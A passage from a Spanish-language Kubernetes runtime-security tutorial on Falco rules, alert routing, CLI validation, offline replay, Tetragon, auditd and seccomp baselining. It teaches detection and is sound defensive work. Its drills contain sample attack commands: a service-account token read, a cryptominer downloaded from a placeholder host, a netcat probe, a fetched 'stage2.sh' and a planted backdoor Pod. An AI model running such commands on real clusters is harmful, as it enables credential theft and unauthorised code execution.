            # ── Slack: only CRITICAL and above reaches humans on call ──
            - name: SLACK_MINIMUMPRIORITY
              value: "critical"
            - name: SLACK_WEBHOOKURL
              valueFrom:
                secretKeyRef:
                  name: falcosidekick-secrets
                  key: SLACK_WEBHOOKURL
            # ── Alertmanager: warning and above becomes a paging signal ──
            - name: ALERTMANAGER_MINIMUMPRIORITY
              value: "warning"
            - name: ALERTMANAGER_HOSTPORT
              valueFrom:
                secretKeyRef:
                  name: falcosidekick-secrets
                  key: ALERTMANAGER_HOSTPORT
            # ── Loki: everything, for forensics and baselining ──
            - name: LOKI_MINIMUMPRIORITY
              value: "debug"
            - name: LOKI_HOSTPORT
              valueFrom:
                secretKeyRef:
                  name: falcosidekick-secrets
                  key: LOKI_HOSTPORT
          resources:
            requests: { cpu: 50m, memory: 64Mi }
            limits:   { cpu: 500m, memory: 256Mi }
          livenessProbe:
            httpGet: { path: /ping, port: 2801 }
            initialDelaySeconds: 10
            periodSeconds: 10
          readinessProbe:
            httpGet: { path: /ping, port: 2801 }
            initialDelaySeconds: 5
            periodSeconds: 10
---
apiVersion: v1
kind: Service
metadata:
  name: falcosidekick
  namespace: falco
  labels:
    app.kubernetes.io/name: falcosidekick
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: falcosidekick
  ports:
    - name: http
      port: 2801
      targetPort: 2801
      protocol: TCP
```

El enrutamiento prioridad-a-destino es el corazón operativo de la analítica de comportamiento. Sin él, una regla de drift de nivel `NOTICE` despierta a alguien a las 03:00 y todo el sistema queda silenciado en una semana.

| Prioridad | Destino | Volumen esperado/día/1000 nodos | Acción humana |
|---|---|---|---|
| `EMERGENCY`–`CRITICAL` | PagerDuty + Slack + SIEM | < 5 | despertar a alguien |
| `ERROR`–`WARNING` | Alertmanager (ticket) + SIEM | 10–100 | triaje el siguiente día hábil |
| `NOTICE`–`INFORMATIONAL` | sólo Loki/SIEM | 10³–10⁴ | combustible de correlación, dashboards |
| `DEBUG` | sólo clústeres de desarrollo | 10⁵+ | nunca en producción |

### 3.6 Workload objetivo para ejercitar las reglas

```yaml
---
apiVersion: v1
kind: Namespace
metadata:
  name: prod-payments
  labels:
    pod-security.kubernetes.io/enforce: baseline
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payments-api
  namespace: prod-payments
  labels:
    app: payments-api
spec:
  replicas: 1
  selector:
    matchLabels:
      app: payments-api
  template:
    metadata:
      labels:
        app: payments-api
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: api
          image: docker.io/library/alpine:3.20
          command: ["/bin/sh", "-c", "while true; do sleep 30; done"]
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: false   # deliberately false, to demo drift
            capabilities:
              drop: ["ALL"]
          resources:
            requests: { cpu: 10m, memory: 32Mi }
            limits:   { cpu: 200m, memory: 128Mi }
          volumeMounts:
            - name: tmp
              mountPath: /tmp
      volumes:
        - name: tmp
          emptyDir: {}
```

---

## 4. Operar Falco desde la CLI

### 4.1 Desplegar y confirmar que el motor levantó

```console
$ kubectl apply -f falco-rbac.yaml -f falco-config.yaml -f falco-rules.yaml -f falco-daemonset.yaml
namespace/falco created
serviceaccount/falco created
clusterrole.rbac.authorization.k8s.io/falco created
clusterrolebinding.rbac.authorization.k8s.io/falco created
configmap/falco-config created
configmap/falco-rules-custom created
daemonset.apps/falco created

$ kubectl -n falco rollout status ds/falco --timeout=180s
Waiting for daemon set "falco" rollout to finish: 0 of 3 updated pods are available...
daemon set "falco" successfully rolled out

$ kubectl -n falco get pods -o wide
NAME          READY   STATUS    RESTARTS   AGE   IP              NODE
falco-8f2kd   1/1     Running   0          71s   10.10.0.11      node-1
falco-dq7lm   1/1     Running   0          71s   10.10.0.12      node-2
falco-r4x9n   1/1     Running   0          71s   10.10.0.10      cp-1
```

Confirmá que cargaron el driver, el ruleset y el plugin:

```console
$ kubectl -n falco logs ds/falco --tail=40
Wed Aug  5 11:02:14 2026: Falco version: 0.41.0 (x86_64)
Wed Aug  5 11:02:14 2026: Falco initialized with configuration files:
Wed Aug  5 11:02:14 2026:    /etc/falco/falco.yaml
Wed Aug  5 11:02:14 2026: System info: Linux, 5.15.0-118-generic
Wed Aug  5 11:02:14 2026: Loading plugin 'container' from file /usr/share/falco/plugins/libcontainer.so
Wed Aug  5 11:02:14 2026: Loading rules from file /etc/falco/falco_rules.yaml
Wed Aug  5 11:02:14 2026: Loading rules from file /etc/falco/rules.d/90-custom-rules.yaml
Wed Aug  5 11:02:15 2026: The chosen syscall buffer dimension is: 8388608 bytes (8 MBs)
Wed Aug  5 11:02:15 2026: Starting health webserver with threadiness 8, listening on 0.0.0.0:8765
Wed Aug  5 11:02:15 2026: Loaded event sources: syscall
Wed Aug  5 11:02:15 2026: Enabled event sources: syscall
Wed Aug  5 11:02:15 2026: Opening 'syscall' source with modern BPF probe.
Wed Aug  5 11:02:15 2026: One ring buffer every '2' CPUs.
```

Las tres líneas que tenés que ver: **`Loading rules from file …90-custom-rules.yaml`**, **`Opening 'syscall' source with modern BPF probe`**, y ningún `Rule loading error`.

### 4.2 Enumerar lo que el motor conoce

```console
$ kubectl -n falco exec ds/falco -- falco --version
Falco version: 0.41.0
Libs version:  0.20.0
Plugin API:    3.11.0
Engine:        modern_ebpf
Engine version: 0.53.0
Driver:
  API version:    8.0.0
  Schema version: 2.0.0

$ kubectl -n falco exec ds/falco -- falco -L | head -30
---------------------
Field Class: process (Process)

proc.pid              The id of the process generating the event.
proc.exe              The first command-line argument (usually the executable name or a custom string).
proc.exepath          The full executable path of the process.
proc.name             The name (excluding the path) of the executable running the process.
proc.args             The arguments passed on the command line when starting the process.
proc.cmdline          The concatenation of "proc.name + proc.args".
proc.pname            The name (excluding the path) of the parent process.
proc.tty              The controlling terminal of the process. 0 for processes without a terminal.
proc.is_exe_upper_layer  'true' if this process' executable file is in the upper layer of the overlayfs.
...

$ kubectl -n falco exec ds/falco -- falco -l "Interactive shell spawned in container"
------------------------------
Rule: Interactive shell spawned in container
Description: A shell with a controlling TTY was executed inside a container. ...
Priority: WARNING
Tags: [container, shell, mitre_execution, T1059]
Source: syscall
```

### 4.3 Validar un archivo de reglas antes de publicarlo

Hacé siempre esto antes del `kubectl apply`. Un error de sintaxis en un ConfigMap tira abajo todo el DaemonSet en la próxima recarga.

```console
$ kubectl -n falco exec ds/falco -- falco -V /etc/falco/rules.d/90-custom-rules.yaml
Wed Aug  5 11:09:41 2026: Validating rules file(s):
Wed Aug  5 11:09:41 2026:    /etc/falco/rules.d/90-custom-rules.yaml
/etc/falco/rules.d/90-custom-rules.yaml: Ok
Ok
```

Y así se ve un fallo — fijate que Falco te da la línea y la columna exactas:

```console
$ falco -V /tmp/broken.yaml
Wed Aug  5 11:11:02 2026: Validating rules file(s):
Wed Aug  5 11:11:02 2026:    /tmp/broken.yaml
/tmp/broken.yaml: 1 errors:
-----
Validation error in "condition": undefined macro 'spawned_proces'
Context: rule 'Interactive shell spawned in container'
   9 |   condition: >
  10 |     spawned_proces
     |     ^^^^^^^^^^^^^^
  11 |     and container
-----
```

### 4.4 Disparar el comportamiento y leer las alertas

Seguí las alertas en el nodo donde corre el Pod objetivo:

```console
$ NODE=$(kubectl -n prod-payments get pod -l app=payments-api -o jsonpath='{.items[0].spec.nodeName}')
$ FALCO=$(kubectl -n falco get pod -l app.kubernetes.io/name=falco \
    --field-selector spec.nodeName=$NODE -o jsonpath='{.items[0].metadata.name}')
$ echo "$NODE -> $FALCO"
node-2 -> falco-dq7lm

$ kubectl -n falco logs -f $FALCO | jq -r 'select(.rule) | "\(.time) [\(.priority)] \(.rule) :: \(.output_fields["proc.cmdline"] // "")"'
```

En una segunda terminal, actuá como el adversario:

```console
$ POD=$(kubectl -n prod-payments get pod -l app=payments-api -o jsonpath='{.items[0].metadata.name}')

$ kubectl -n prod-payments exec -it $POD -- sh
/ $ cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 40
eyJhbGciOiJSUzI1NiIsImtpZCI6IkpXVDBf
/ $ wget -q -O /tmp/xmrig https://example.invalid/xmrig
/ $ chmod +x /tmp/xmrig
/ $ /tmp/xmrig --version
/ $ nc -zv 203.0.113.10 4444
/ $ exit
```

El seguimiento produce:

```console
2026-08-05T11:14:03.118442901Z [Warning] Interactive shell spawned in container :: sh
2026-08-05T11:14:11.902337114Z [Critical] Service account token read by suspicious process :: cat /var/run/secrets/kubernetes.io/serviceaccount/token
2026-08-05T11:14:24.551009882Z [Notice] New executable written to container filesystem :: wget -q -O /tmp/xmrig https://example.invalid/xmrig
2026-08-05T11:14:38.220417033Z [Critical] Binary not in container image was executed (container drift) :: /tmp/xmrig --version
2026-08-05T11:14:49.774102918Z [Warning] Recon/transfer tool connected to public address :: nc -zv 203.0.113.10 4444
```

El registro JSON completo — esta es la forma que ingiere tu SIEM:

```console
$ kubectl -n falco logs $FALCO | jq 'select(.rule == "Binary not in container image was executed (container drift)")' | head -40
{
  "hostname": "node-2",
  "output": "Binary not in container image was executed (container drift) (time=2026-08-05T11:14:38.220417033Z user=root uid=0 exe=/tmp/xmrig cmdline=xmrig --version parent=sh container=api image=docker.io/library/alpine ns=prod-payments pod=payments-api-7c9f8d6b54-k2vzp)",
  "priority": "Critical",
  "rule": "Binary not in container image was executed (container drift)",
  "source": "syscall",
  "tags": [
    "T1204",
    "container",
    "drift",
    "mitre_execution"
  ],
  "time": "2026-08-05T11:14:38.220417033Z",
  "output_fields": {
    "container.image.repository": "docker.io/library/alpine",
    "container.name": "api",
    "evt.time.iso8601": "2026-08-05T11:14:38.220417033Z",
    "k8s.ns.name": "prod-payments",
    "k8s.pod.name": "payments-api-7c9f8d6b54-k2vzp",
    "proc.cmdline": "xmrig --version",
    "proc.exepath": "/tmp/xmrig",
    "proc.pname": "sh",
    "user.name": "root",
    "user.uid": 0
  }
}
```

### 4.5 Ejecutar una regla ad hoc — el patrón del examen

La forma más rápida de probar una sola regla en un nodo, sin tocar el despliegue del clúster. `-M 60` acota la ejecución a 60 segundos para que nunca dejes un proceso colgado.

```console
$ cat > /tmp/one-rule.yaml <<'EOF'
- macro: spawned_process
  condition: evt.type in (execve, execveat) and evt.dir = <

- rule: Package management in container
  desc: Package manager executed inside a running container.
  condition: >
    spawned_process
    and container.id != host
    and proc.name in (apk, apt, apt-get, dnf, yum, rpm, dpkg, pip, pip3, npm)
  output: "%evt.time,%user.uid,%proc.name,%container.name,%k8s.ns.name"
  priority: WARNING
  source: syscall
EOF

$ falco -r /tmp/one-rule.yaml -o json_output=false -o buffered_outputs=false -M 60
Wed Aug  5 11:22:07 2026: Falco version: 0.41.0 (x86_64)
Wed Aug  5 11:22:07 2026: Loading rules from file /tmp/one-rule.yaml
Wed Aug  5 11:22:07 2026: Enabled event sources: syscall
Wed Aug  5 11:22:07 2026: Opening 'syscall' source with modern BPF probe.
11:22:31.443118722: Warning 11:22:31.443118722,0,apk,api,prod-payments
11:22:44.902551038: Warning 11:22:44.902551038,0,apk,api,prod-payments
Wed Aug  5 11:23:07 2026: Closing event source 'syscall'
Wed Aug  5 11:23:07 2026: Events detected: 2
Wed Aug  5 11:23:07 2026: Rule counts by severity:
   WARNING: 2
Wed Aug  5 11:23:07 2026: Triggered rules by rule name:
   Package management in container: 2
```

Dos flags que importan para las tareas del examen del estilo "escribí las alertas en `/opt/answer.txt`":

- `-o buffered_outputs=false` — sin esto, Falco bufferea stdout y tu archivo puede estar vacío cuando el corrector lo mire.
- `-o json_output=false` más un `output:` separado por comas te da exactamente la forma CSV que suele pedir la tarea.

Persistir a un archivo, de dos maneras:

```console
# (a) Falco's own file output
$ falco -r /tmp/one-rule.yaml \
        -o json_output=false \
        -o buffered_outputs=false \
        -o stdout_output.enabled=false \
        -o file_output.enabled=true \
        -o file_output.filename=/opt/incident.log \
        -M 45

$ cat /opt/incident.log
11:31:02.118442901: Warning 11:31:02.118442901,0,apk,api,prod-payments

# (b) shell redirection of the running DaemonSet, filtered with jq
$ kubectl -n falco logs $FALCO --since=10m \
  | jq -r 'select(.rule=="Package management in container")
           | [.time, .output_fields["user.uid"], .output_fields["proc.name"],
              .output_fields["k8s.ns.name"], .output_fields["k8s.pod.name"]]
           | @csv' > /opt/incident.log
```

### 4.6 Recarga en caliente

Falco viene con `watch_config_files: true`, así que editar un archivo de reglas en disco dispara una recarga en segundos. En Kubernetes, la propagación del ConfigMap al volumen montado tarda hasta `kubelet --sync-frequency` (60s por defecto) más el TTL de caché — o sea que funciona, pero no es instantáneo.

```console
$ kubectl -n falco create configmap falco-rules-custom \
    --from-file=90-custom-rules.yaml=./90-custom-rules.yaml \
    --dry-run=client -o yaml | kubectl apply -f -
configmap/falco-rules-custom configured

# Wait for the projected volume to update, or force it:
$ kubectl -n falco rollout restart ds/falco
daemonset.apps/falco restarted

# On a bare-metal / systemd node the equivalent is:
$ sudo systemctl reload falco       # sends SIGHUP
$ sudo systemctl restart falco      # full restart
$ sudo journalctl -u falco -f --since "5 min ago"
```

### 4.7 Generar tráfico de forma determinista

No improvises comportamiento de atacante cuando estás validando un pipeline. Usá el generador oficial:

```console
$ kubectl -n prod-payments run event-generator --restart=Never \
    --image=docker.io/falcosecurity/event-generator:latest \
    -- run syscall --loop
pod/event-generator created

$ kubectl -n falco logs $FALCO --tail=8 | jq -r '"\(.priority)\t\(.rule)"'
Notice   Create files below dev
Warning  Read sensitive file untrusted
Notice   Write below binary dir
Error    Change thread namespace
Warning  Non sudo setuid
Notice   Directory traversal monitored file read
Warning  Search private keys or passwords
Notice   Write below etc

$ kubectl -n prod-payments delete pod event-generator
pod "event-generator" deleted
```

---

## 5. Análisis offline: capturá una vez, iterá sobre las reglas para siempre

Desarrollar reglas contra tráfico en vivo es lento y no reproducible. Capturá un archivo `.scap` durante un incidente (o durante un ejercicio de red team) y reproducilo tantas veces como necesites.

```console
# Capture 120 seconds of raw syscall activity on the node
$ sudo sysdig -w /var/tmp/incident-20260805.scap -M 120
$ ls -lh /var/tmp/incident-20260805.scap
-rw-r--r--. 1 root root 412M Aug  5 11:41 /var/tmp/incident-20260805.scap

# Replay it through any ruleset — no kernel involvement, fully deterministic
$ falco -e /var/tmp/incident-20260805.scap -r /tmp/one-rule.yaml -o json_output=false
Wed Aug  5 11:44:19 2026: Falco version: 0.41.0 (x86_64)
Wed Aug  5 11:44:19 2026: Reading from capture file /var/tmp/incident-20260805.scap
11:39:02.118442901: Warning 11:39:02.118442901,0,apk,api,prod-payments
Wed Aug  5 11:44:23 2026: Events detected: 1
```

También podés recortar la captura directamente con el lenguaje de filtros de `sysdig` — la misma sintaxis que usan las condiciones de Falco:

```console
$ sysdig -r /var/tmp/incident-20260805.scap -p"%evt.time %container.name %proc.name %proc.cmdline" \
    "evt.type=execve and evt.dir=< and container.id!=host"
11:39:00.881233 api sh sh
11:39:02.118442 api apk apk add curl
11:39:07.554901 api curl curl -sSL https://example.invalid/stage2.sh

# Aggregate: which containers spawned the most processes?
$ sysdig -r /var/tmp/incident-20260805.scap -c topprocs_cpu "container.name=api"
CPU%   Process     PID     Container
------------------------------------
18.42% xmrig       21883   api
 1.03% sh          21501   api
 0.11% apk         21744   api
```

---

## 6. Alternativas y dónde encaja cada una

### 6.1 Tetragon — observación eBPF *con enforcement dentro del kernel*

Falco detecta. Tetragon puede detectar **y matar**, de forma síncrona, desde dentro del kernel, cerrando la brecha entre detección y respuesta de segundos a microsegundos.

```yaml
---
apiVersion: cilium.io/v1alpha1
kind: TracingPolicyNamespaced
metadata:
  name: block-serviceaccount-token-read
  namespace: prod-payments
spec:
  kprobes:
    - call: "security_file_permission"
      syscall: false
      return: true
      args:
        - index: 0
          type: "file"
        - index: 1
          type: "int"
      returnArg:
        index: 0
        type: "int"
      returnArgAction: "Post"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Prefix"
              values:
                - "/var/run/secrets/kubernetes.io/serviceaccount"
            - index: 1
              operator: "Equal"
              values:
                - "4"          # MAY_READ
          matchBinaries:
            - operator: "NotIn"
              values:
                - "/usr/local/bin/payments-api"
          matchActions:
            - action: Sigkill    # in-kernel termination, not a log line
```

```console
$ kubectl apply -f tetragon-policy.yaml
tracingpolicynamespaced.cilium.io/block-serviceaccount-token-read created

$ kubectl -n kube-system exec ds/tetragon -c tetragon -- \
    tetra getevents -o compact --namespace prod-payments
🚀 process prod-payments/payments-api-7c9f8d6b54-k2vzp /bin/sh
🚀 process prod-payments/payments-api-7c9f8d6b54-k2vzp /bin/cat /var/run/secrets/kubernetes.io/serviceaccount/token
📚 read    prod-payments/payments-api-7c9f8d6b54-k2vzp /bin/cat /var/run/secrets/kubernetes.io/serviceaccount/token
💥 exit    prod-payments/payments-api-7c9f8d6b54-k2vzp /bin/cat /var/run/secrets/kubernetes.io/serviceaccount/token SIGKILL
```

### 6.2 auditd — el plano a nivel de host que el examen sigue evaluando

Los nodos de Kubernetes son hosts Linux. Manipular `/etc/kubernetes/manifests`, `/var/lib/kubelet/config.yaml` o las claves de la CA es un compromiso del plano de control que ninguna herramienta con alcance de contenedor ve.

```bash
# /etc/audit/rules.d/50-k8s-node.rules
## Delete existing rules and set the buffer
-D
-b 8192
--backlog_wait_time 60000

## Kubernetes configuration and PKI — write and attribute changes
-w /etc/kubernetes/                    -p wa -k k8s-config
-w /etc/kubernetes/pki/                -p wa -k k8s-pki
-w /var/lib/kubelet/config.yaml        -p wa -k kubelet-config
-w /var/lib/kubelet/pki/               -p wa -k kubelet-pki
-w /etc/kubernetes/manifests/          -p wa -k static-pods

## Container runtime configuration and state
-w /etc/containerd/config.toml         -p wa -k containerd-config
-w /etc/crictl.yaml                    -p wa -k crictl-config
-w /var/lib/containerd/                -p wa -k containerd-state

## Runtime binaries
-w /usr/bin/containerd                 -p x  -k container-runtime-exec
-w /usr/bin/runc                       -p x  -k container-runtime-exec
-w /usr/bin/crictl                     -p x  -k container-runtime-exec
-w /usr/bin/kubectl                    -p x  -k kubectl-exec

## Kernel module manipulation — classic escape/rootkit persistence
-a always,exit -F arch=b64 -S init_module,finit_module,delete_module -k kernel-modules

## Namespace manipulation from a non-root uid
-a always,exit -F arch=b64 -S setns,unshare -F auid>=1000 -F auid!=-1 -k namespace-manipulation

## Privilege escalation
-a always,exit -F arch=b64 -S execve -C uid!=euid -F euid=0 -k setuid-exec

## Make the ruleset immutable until reboot (audit best practice)
-e 2
```

```console
$ sudo augenrules --load
$ sudo auditctl -s
enabled 2
failure 1
pid 1188
rate_limit 0
backlog_limit 8192
lost 0
backlog 0
backlog_wait_time 60000

$ sudo auditctl -l | head -5
-w /etc/kubernetes -p wa -k k8s-config
-w /etc/kubernetes/pki -p wa -k k8s-pki
-w /var/lib/kubelet/config.yaml -p wa -k kubelet-config
-w /var/lib/kubelet/pki -p wa -k kubelet-pki
-w /etc/kubernetes/manifests -p wa -k static-pods

# Someone drops a static Pod on the control plane:
$ sudo ausearch -k static-pods -i --start recent
----
type=PROCTITLE msg=audit(08/05/2026 11:52:44.201:8812) : proctitle=vi /etc/kubernetes/manifests/backdoor.yaml
type=PATH msg=audit(08/05/2026 11:52:44.201:8812) : item=1 name=/etc/kubernetes/manifests/backdoor.yaml
    inode=262401 dev=fd:00 mode=file,644 ouid=root ogid=root nametype=CREATE
type=CWD msg=audit(08/05/2026 11:52:44.201:8812) : cwd=/root
type=SYSCALL msg=audit(08/05/2026 11:52:44.201:8812) : arch=x86_64 syscall=openat
    success=yes exit=4 ppid=41022 pid=41190 auid=deploy uid=root gid=root euid=root
    suid=root fsuid=root comm=vi exe=/usr/bin/vim.basic key=static-pods

$ sudo aureport -k --summary
Key Summary Report
===========================
total  key
===========================
   142  k8s-config
    88  container-runtime-exec
    31  static-pods
     4  kernel-modules
     1  namespace-manipulation
```

`auid=deploy` es el campo crucial: es el **login uid**, inmutable después del login, y sobrevive a `sudo` y `su`. `uid=root` no te dice nada sobre quién es el responsable; `auid` sí.

### 6.3 Grabación de baseline con el Security Profiles Operator

Esta es la mitad de "aprender lo normal y después congelarlo" de la analítica de comportamiento.

```yaml
---
apiVersion: security-profiles-operator.x-k8s.io/v1alpha1
kind: ProfileRecording
metadata:
  name: payments-api-baseline
  namespace: prod-payments
spec:
  kind: SeccompProfile
  recorder: bpf              # `logs` uses audit records instead; bpf is lower overhead
  podSelector:
    matchLabels:
      app: payments-api
```

```console
$ kubectl label ns prod-payments spo.x-k8s.io/enable-recording=true
namespace/prod-payments labeled

$ kubectl apply -f profilerecording.yaml
profilerecording.security-profiles-operator.x-k8s.io/payments-api-baseline created

$ kubectl -n prod-payments rollout restart deploy/payments-api
deployment.apps/payments-api restarted

# ... drive representative production traffic for a full business cycle ...

$ kubectl delete profilerecording -n prod-payments payments-api-baseline
profilerecording.security-profiles-operator.x-k8s.io "payments-api-baseline" deleted

$ kubectl -n prod-payments get seccompprofile
NAME                            STATUS      AGE
payments-api-baseline-api       Installed   14s

$ kubectl -n prod-payments get seccompprofile payments-api-baseline-api -o yaml | head -30
apiVersion: security-profiles-operator.x-k8s.io/v1beta1
kind: SeccompProfile
metadata:
  name: payments-api-baseline-api
  namespace: prod-payments
spec:
  architectures:
    - SCMP_ARCH_X86_64
  defaultAction: SCMP_ACT_ERRNO
  syscalls:
    - action: SCMP_ACT_ALLOW
      names:
        - accept4
        - access
        - arch_prctl
        - bind
        - brk
        - clock_gettime
        - clone3
        - close
        - connect
        - epoll_create1
        - epoll_ctl
        - epoll_pwait
        - execve
        ...
```

El perfil grabado se adjunta después con `securityContext.seccompProfile.type: Localhost`. **Nunca lleves un perfil grabado directo a producción**: una grabación captura sólo los caminos que se ejercitaron. Corrélo primero en modo `SCMP_ACT_LOG` y observá el log de auditoría buscando denegaciones que se habrían producido.

### 6.4 Matriz de comparación

| | **Falco** | **Tetragon** | **auditd** | **KubeArmor** | **Inspektor Gadget** |
|---|---|---|---|---|---|
| Propósito principal | detección | detección + enforcement | rastro de auditoría del host | enforcement de políticas | depuración y perfilado ad hoc |
| Fuente de datos | syscalls (eBPF/kmod) | kprobes/LSM/tracepoints eBPF | subsistema de auditoría del kernel | LSM (BPF-LSM/AppArmor/SELinux) | gadgets eBPF |
| Enforcement | no (sólo detección) | **sí** (`Sigkill`, `Override`) | no | **sí** (bloquear/auditar) | no |
| Enriquecimiento K8s | plugin container + k8smeta opcional | nativo, integrado con Cilium | ninguno (sólo host) | nativo | nativo |
| Lenguaje de reglas | DSL de filtros de sysdig | CRD `TracingPolicy` | reglas de auditctl | CRD `KubeArmorPolicy` | flags de CLI |
| Overhead | bajo (típicamente 1–3% CPU/nodo) | bajo | **puede ser alto** (`-a always,exit -S execve` en un nodo cargado) | bajo | bajo demanda |
| Estado CNCF | **Graduated** | Incubating (Cilium) | no es CNCF (Linux) | Incubating | Sandbox |
| Latencia de detección | ms (asíncrona, post-hoc) | µs (en el kernel, síncrona) | ms | µs | n/a |
| Aprendizaje/baselining | no | no | no | parcial | **sí** (`advise seccomp-profile`, `advise network-policy`) |
| **Relevancia para el examen CKS** | **muy alta** | baja | **media** | baja | baja |

Guía práctica: **Falco para amplitud de detección, Tetragon para enforcement quirúrgico en tus workloads de mayor valor, auditd para el host y el plano de control, SPO/Inspektor Gadget para derivar los baselines.** Son capas complementarias, no competidoras.

### 6.5 Mapear reglas a MITRE ATT&CK for Containers

La cobertura debe argumentarse en términos de ATT&CK, no en "cantidad de reglas".

| Táctica | Técnica | Señal observable | Regla mostrada arriba |
|---|---|---|---|
| Initial Access | T1190 Exploit Public-Facing App | un proceso de servidor web lanza una shell | *Interactive shell spawned in container* |
| Execution | T1059 Command & Scripting Interpreter | `execve` de un binario de shell | *Interactive shell spawned in container* |
| Execution | T1204 User Execution | `proc.is_exe_upper_layer = true` | *Drifted binary executed in container* |
| Persistence | T1105 Ingress Tool Transfer | escritura en `/tmp`, `/dev/shm`, directorios de binarios | *New executable written to container filesystem* |
| Privilege Escalation | T1611 Escape to Host | `setns`, `unshare`, `mount`, `init_module` | *Container escape primitive observed* |
| Privilege Escalation | T1548 Abuse Elevation Control | `setuid(0)` desde un usuario no root | *Privilege escalation to root inside container* |
| Credential Access | T1552.001 Credentials In Files | lectura de la ruta del token de SA | *Service account token read by unexpected process* |
| Discovery | T1613 Container & Resource Discovery | ejecución de `kubectl`/`crictl` dentro de un contenedor | extender *Interactive shell* con esos binarios |
| Command & Control | T1071 Application Layer Protocol | `connect` a una IP pública desde una herramienta de recon | *Recon tool connected to public address* |
| Impact | T1496 Resource Hijacking | binario drifted + CPU sostenida | regla de drift + correlación con CPU de Prometheus |

---

## 7. Verificación y diagnóstico de fallos

Esta sección es la diferencia entre un Falco que *parece* funcionar y un Falco en el que confiarías durante un incidente.

### 7.1 Checklist de salud

```console
# 1. Every node has a running agent
$ kubectl -n falco get ds falco
NAME    DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   AGE
falco   3         3         3       3            3           41m

# 2. The health endpoint answers
$ kubectl -n falco exec ds/falco -- curl -sS localhost:8765/healthz
{"healthy":true}

# 3. Your rules are actually loaded (not just present in the ConfigMap)
$ kubectl -n falco logs ds/falco | grep -E "Loading rules|Rule loading|error"
Wed Aug  5 11:02:14 2026: Loading rules from file /etc/falco/falco_rules.yaml
Wed Aug  5 11:02:14 2026: Loading rules from file /etc/falco/rules.d/90-custom-rules.yaml

# 4. The specific rule exists in the loaded engine
$ kubectl -n falco exec ds/falco -- falco -l "Drifted binary executed in container"
------------------------------
Rule: Drifted binary executed in container
Priority: CRITICAL

# 5. It fires end to end
$ kubectl -n prod-payments exec $POD -- sh -c 'cp /bin/ls /tmp/ls2 && /tmp/ls2 /'
$ kubectl -n falco logs $FALCO --since=1m | jq -r 'select(.rule|test("Drifted")) | .output'
Binary not in container image was executed (container drift) (time=... exe=/tmp/ls2 ...)
```

**Sólo el paso 5 prueba algo.** Los pasos 1–4 son necesarios, no suficientes. Institucionalizá el paso 5: un CronJob que dispare una regla canario benigna por hora y una alerta ante su *ausencia* es el control operativo de mayor valor de todo este dominio.

```yaml
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: falco-canary
  namespace: falco
spec:
  schedule: "*/15 * * * *"
  concurrencyPolicy: Forbid
  successfulJobsHistoryLimit: 1
  failedJobsHistoryLimit: 3
  jobTemplate:
    spec:
      backoffLimit: 1
      template:
        spec:
          restartPolicy: Never
          securityContext:
            runAsNonRoot: true
            runAsUser: 65534
            seccompProfile:
              type: RuntimeDefault
          containers:
            - name: canary
              image: docker.io/library/busybox:1.36
              command:
                - /bin/sh
                - -c
                - |
                  # Deliberately trips "New executable written to container filesystem"
                  cp /bin/true /tmp/falco-canary-$(date +%s)
                  chmod +x /tmp/falco-canary-*
                  /tmp/falco-canary-* || true
              securityContext:
                allowPrivilegeEscalation: false
                capabilities:
                  drop: ["ALL"]
              resources:
                requests: { cpu: 10m, memory: 16Mi }
                limits:   { cpu: 50m, memory: 32Mi }
```

Combinalo con una regla de alerta que dispare cuando la detección del canario *falta*:

```yaml
---
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: falco-pipeline-health
  namespace: falco
spec:
  groups:
    - name: falco.pipeline
      rules:
        - alert: FalcoDetectionPipelineDead
          expr: |
            sum(increase(falcosecurity_falcosidekick_falco_events_total{priority="notice"}[30m])) == 0
          for: 15m
          labels:
            severity: critical
          annotations:
            summary: "Falco canary has not produced an event in 30 minutes"
            description: >
              The falco-canary CronJob trips a NOTICE rule every 15 minutes.
              Zero events means the detection pipeline is broken somewhere between
              the kernel driver and Falcosidekick — treat as a security outage.

        - alert: FalcoSyscallEventDrops
          expr: |
            rate(falcosecurity_evt_hostname_n_drops_total[5m]) > 0
          for: 10m
          labels:
            severity: warning
          annotations:
            summary: "Falco is dropping syscall events on {{ $labels.hostname }}"
            description: "Dropped events are undetected events. Increase buf_size_preset or narrow base_syscalls."
```

### 7.2 Tabla de decisión para diagnóstico

| Síntoma | Causa probable | Comando para confirmar | Solución |
|---|---|---|---|
| Pod en `CrashLoopBackOff`, log `Runtime error: can't open device /dev/falco0` | módulo de kernel no cargado | `lsmod \| grep falco` | ejecutar el initContainer driver-loader, o cambiar a `modern_ebpf` |
| Log: `Unable to load the driver … BTF not available` | `CONFIG_DEBUG_INFO_BTF` desactivado | `ls /sys/kernel/btf/vmlinux` | caer a `ebpf` o `kmod` |
| Log: `bpf: failed to load program … permission denied` | falta `CAP_BPF`/`CAP_PERFMON` | `kubectl -n falco get pod $FALCO -o jsonpath='{.spec.containers[0].securityContext}'` | agregar capabilities, o `privileged: true` |
| El archivo de reglas está presente pero nunca se carga | no figura en `rules_files`, o `rules.d` no está montado | `kubectl -n falco logs ds/falco \| grep "Loading rules"` | corregir `rules_files`, verificar la ruta del volumeMount |
| `Rule loading error: undefined macro` | macro definida después de su uso, o en un archivo cargado más tarde | `falco -V <file>` | definir las macros arriba de las reglas, ordenar bien `rules_files` |
| `Rule loading error: rule 'X' already exists` | el mismo nombre de regla en dos archivos sin `override` | `grep -rn "rule: X" /etc/falco/` | renombrar, o agregar el bloque `override:` |
| La regla carga pero nunca dispara | el `priority` de `falco.yaml` está por encima de la prioridad de la regla | `kubectl -n falco exec ds/falco -- grep '^priority' /etc/falco/falco.yaml` | bajar el `priority` global |
| La regla carga pero nunca dispara (2) | la syscall requerida no está trazada | `kubectl -n falco logs ds/falco \| grep -i "base_syscalls"` | poner `base_syscalls.repair: true`, o correr con `-A` |
| La regla carga pero nunca dispara (3) | la regla de exec usa `evt.dir = >` | leer la condición | las reglas de exec **deben** usar `evt.dir = <` |
